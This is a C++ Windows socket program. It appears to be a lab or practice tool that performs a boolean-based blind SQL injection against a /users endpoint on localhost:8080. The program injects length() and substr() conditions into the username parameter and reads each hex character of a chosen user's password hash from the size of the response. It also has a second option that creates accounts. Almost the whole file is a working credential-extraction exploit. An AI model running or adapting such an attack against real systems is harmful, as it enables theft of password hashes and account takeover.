#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <iostream>
#include <string>

#pragma comment(lib, "Ws2_32.lib")

using namespace std;

int main()
{
	WSADATA wsaData;
	int iResult;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed: %d\n", iResult);
		return 1;
	}

	struct addrinfo* 
		result = NULL,
		* ptr = NULL,
		hints;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

#define DEFAULT_PORT "8080"

	// Resolve the server address and port
	iResult = getaddrinfo("localhost", DEFAULT_PORT, &hints, &result);
	if (iResult != 0) 
	{
		printf("getaddrinfo failed: %d\n", iResult);
		WSACleanup();
		return 1;
	}
	SOCKET ConnectSocket = INVALID_SOCKET;

	// Attempt to connect to the first address returned by
	// the call to getaddrinfo
	ptr = result;

	// Create a SOCKET for connecting to server
	ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
		ptr->ai_protocol);

	if (ConnectSocket == INVALID_SOCKET) 
	{
		printf("Error at socket(): %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return 1;
	}

	// Connect to server.
	iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	if (iResult == SOCKET_ERROR) 
	{
		closesocket(ConnectSocket);
		ConnectSocket = INVALID_SOCKET;
	}

	freeaddrinfo(result);

	if (ConnectSocket == INVALID_SOCKET) 
	{
		printf("Unable to connect to server!\n");
		WSACleanup();
		return 1;
	}

#define DEFAULT_BUFLEN 512

	int recvbuflen = DEFAULT_BUFLEN;

	string host = "http://localhost:8080";
	string username;
	string password;
	string firstName;
	string lastName;
	int check1 = 1;
	int check2 = 0;
	char character[16] = { 'a','b','c','d','e','f','0','1','2','3','4','5','6','7','8','9' };
	string path = "/users?username=" + username + "%27%20and%20substr(password," + to_string(check1) + ",1)%20=%20%27"+character[check2];
	string pathLength = "/users?username=" + username + "%27%20and%20length(password)%20=%20%27" + to_string(check1);
	string pathUser = "/users";
	bool lengthTrue = false;
	int length = 0;
	string answer;

	string requestForChar = "GET " + path + " HTTP/1.1\nHost: " + host + "\n\n";
	string requestForLength = "GET " + pathLength + " HTTP/1.1\nHost: " + host + "\n\n";
	string requestForUser = "POST " + pathUser + " HTTP/1.1\nHost: " + host + "\nContent-Type:application/json\n{\"userName\":\""+ username + "\",\"userFName\":\"" + firstName + "\",\"userFName\":\"" + lastName + "\",\"password\":\"" + password + "\"}\n";
	
	char recvbuf[DEFAULT_BUFLEN];	
	int recResult;
	int choice;
	
	cout << "What u wanna do?\n1. Find hash\n2. Create an account" << endl;
	cin >> choice;
	if (choice == 1)
	{
		cout << "Which account you want to get the password hash for?" << endl;
		cin >> username;
		// Send an initial buffer
		iResult = send(ConnectSocket, requestForLength.c_str(), requestForLength.size(), 0);
		if (iResult == SOCKET_ERROR) 
		{
			printf("send failed: %d\n", WSAGetLastError());
			closesocket(ConnectSocket);
			WSACleanup();
			return 1;
		}


		printf("Bytes Sent: %ld\n", iResult);

		// Receive data until the server closes the connection
		do {
			recResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
			if (recResult > 0)
			{
				//cout.write(recvbuf, recResult);
				if (recResult != 236 && !lengthTrue)
				{
					check1++;
					pathLength = "/users?username=" + username + "%27%20and%20length(password)%20=%20%27" + to_string(check1);
					requestForLength = "GET " + pathLength + " HTTP/1.1\nHost: " + host + "\n\n";
					iResult = send(ConnectSocket, requestForLength.c_str(), requestForLength.size(), 0);
					if (iResult == SOCKET_ERROR) 
					{
						printf("send failed: %d\n", WSAGetLastError());
						closesocket(ConnectSocket);
						WSACleanup();
						return 1;
					}
				}
				else if (recResult == 236 && !lengthTrue)
				{
					length = check1;
					check1 = 1;
					lengthTrue = true;
					path = "/users?username=" + username + "%27%20and%20substr(password," + to_string(check1) + ",1)%20=%20%27" + character[check2];
					requestForChar = "GET " + path + " HTTP/1.1\nHost: " + host + "\n\n";
					iResult = send(ConnectSocket, requestForChar.c_str(), requestForChar.size(), 0);
					if (iResult == SOCKET_ERROR) 
					{
						printf("send failed: %d\n", WSAGetLastError());
						closesocket(ConnectSocket);
						WSACleanup();
						return 1;
					}
				}
				else if (recResult != 236 && lengthTrue)
				{
					check2++;
					path = "/users?username=" + username + "%27%20and%20substr(password," + to_string(check1) + ",1)%20=%20%27" + character[check2];
					requestForChar = "GET " + path + " HTTP/1.1\nHost: " + host + "\n\n";
					iResult = send(ConnectSocket, requestForChar.c_str(), requestForChar.size(), 0);
					if (iResult == SOCKET_ERROR) {
						printf("send failed: %d\n", WSAGetLastError());
						closesocket(ConnectSocket);
						WSACleanup();
						return 1;
					}
				}
				else
				{
					answer.push_back(character[check2]);
					if (length == check1)
					{
						printf("\n%s password hash is: %s\n", username.c_str(), answer.c_str());
						printf("%s password hash length is: %d\n", username.c_str(), length);
						return 0;
					}
					check2 = 0;
					check1++;
					path = "/users?username=" + username + "%27%20and%20substr(password," + to_string(check1) + ",1)%20=%20%27" + character[check2];
					requestForChar = "GET " + path + " HTTP/1.1\nHost: " + host + "\n\n";
					iResult = send(ConnectSocket, requestForChar.c_str(), requestForChar.size(), 0);
					if (iResult == SOCKET_ERROR) {
						printf("send failed: %d\n", WSAGetLastError());
						closesocket(ConnectSocket);
						WSACleanup();
						return 1;
					}
				}
			}
			else if (recResult == 0)
				printf("Connection closed\n");
			else
				printf("recv failed: %d\n", WSAGetLastError());
		} while (recResult > 0);
		cout << answer << endl;
	}
	else if (choice == 2)
	{
		cout << "Enter username:" << endl;
		cin >> username;
		cout << "Enter password:" << endl;
		cin >> password;
		cout << "Enter first name:" << endl;
		cin >> firstName;
		cout << "Enter last name:" << endl;
		cin >> lastName;
		string body = "{\"userName\":\"" + username + "\",\"userFName\":\"" + firstName + "\",\"userLName\":\"" + lastName + "\",\"password\":\"" + password + "\"}\r\n\r\n";

		requestForUser = "POST " + pathUser + " HTTP/1.1\r\nHost: " + host + "\r\nContent-Type: application/json\r\nContent-Length: " + to_string(body.length()) + "\r\n\r\n" + body;

		iResult = send(ConnectSocket, requestForUser.c_str(), requestForUser.size(), 0);
		if (iResult == SOCKET_ERROR) {
			printf("send failed: %d\n", WSAGetLastError());
			closesocket(ConnectSocket);
			WSACleanup();
			return 1;
		}
		// Receive data until the server closes the connection
		do {
			recResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
			if (recResult > 0)
			{
				cout.write(recvbuf, recResult);
			}

			else if (recResult == 0)
				printf("Connection closed\n");
			else
				printf("recv failed: %d\n", WSAGetLastError());
		} while (recResult > 0);
	}
	iResult = shutdown(ConnectSocket, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		printf("shutdown failed: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return 1;
	}

	// cleanup
	closesocket(ConnectSocket);
	WSACleanup();

	return 0;
}


